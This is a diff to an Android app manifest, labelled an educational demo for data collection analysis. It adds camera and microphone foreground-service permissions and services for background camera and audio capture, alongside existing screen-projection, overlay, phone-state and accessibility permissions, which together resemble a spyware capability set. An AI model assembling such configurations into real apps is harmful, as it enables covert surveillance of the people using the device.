@@ -17,7 +17,9 @@
 
     <!-- EDUCATIONAL DEMO: Permissions for data collection analysis exercises -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
 
@@ -96,6 +98,18 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Foreground service for background camera capture -->
+        <service
+            android:name=".services.CameraCaptureService"
+            android:exported="false"
+            android:foregroundServiceType="camera" />
+
+        <!-- Foreground service for background audio capture -->
+        <service
+            android:name=".services.AudioCaptureService"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
 
     </application>
 
